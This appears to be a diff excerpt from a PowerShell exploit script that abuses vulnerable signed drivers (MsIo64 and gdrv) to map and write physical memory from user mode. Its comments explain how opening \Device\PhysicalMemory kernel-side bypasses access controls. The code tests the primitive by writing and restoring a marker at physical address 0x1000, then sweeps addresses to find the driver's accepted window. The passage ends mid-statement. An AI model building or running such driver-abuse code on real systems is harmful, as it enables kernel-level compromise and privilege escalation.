@@ -1,0 +1,25 @@
+ 289|                         $verdict.W2_msio = $true
+ 290|                         Log ("    W2 PASS - user view at 0x{0:x} maps pa=0x1000; marker test:" -f $v)
+ 291|                         $o2 = [P36Prov]::ReadAt($v, 8)
+ 292|                         [P36Prov]::WriteAt($v, $MARK) | Out-Null
+ 293|                         $back = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+ 294|                         [P36Prov]::WriteAt($v, [byte[]]($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+ 295|                         $res = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+ 296|                         Log ("    orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, ([P36Prov]::Hex($MARK)), $back, $res)
+ 297|                         if ($back -ne ([P36Prov]::Hex($MARK)) -or $res -ne $o2) { $verdict.W2_msio = $false; Log '    W2 marker NOT coherent' }
+ 298|                     }
+ 299|                 }
+ 300|             }
+ 301|         }
+ 302|         if ($verdict.W2_msio) { break }
+ 303|     }
+ 304|     # REVISED-2 shape, from the full worker-0x1090 RE (temp\drv\annot_MsIo64.txt):
+ 305|     #   in = { q0 = len (driver caps at 4), q1 = user VA whose low32 == the PA to map,
+ 306|     #          q2/q3/q4 = 0 in -> section handle / view base in OUR process / object out }.
+ 307|     #   The driver opens \Device\PhysicalMemory KERNEL-side (Zw, PreviousMode=kernel),
+ 308|     #   so the usermode DACL that kills W1 does not apply; the view lands in our own
+ 309|     #   process at SectionOffset=low32(q1), ViewSize=min(q0,4), RW+NOCACHE.
+ 310|     #   Worker 0x10aa range-checks low32(q1) in [G, G+0x10000000) of a driver global
+ 311|     #   (unknown statically) -> outside = err 5.  Sweep PAs; the OK-vs-err5 pattern
+ 312|     #   reveals the window, and in-window RAM PAs get the full marker test.
+ 313|     foreach ($pa in [uint64]0x20000, [uint64]0x100000, [uint64]0x200000, [uint64]0x800000,
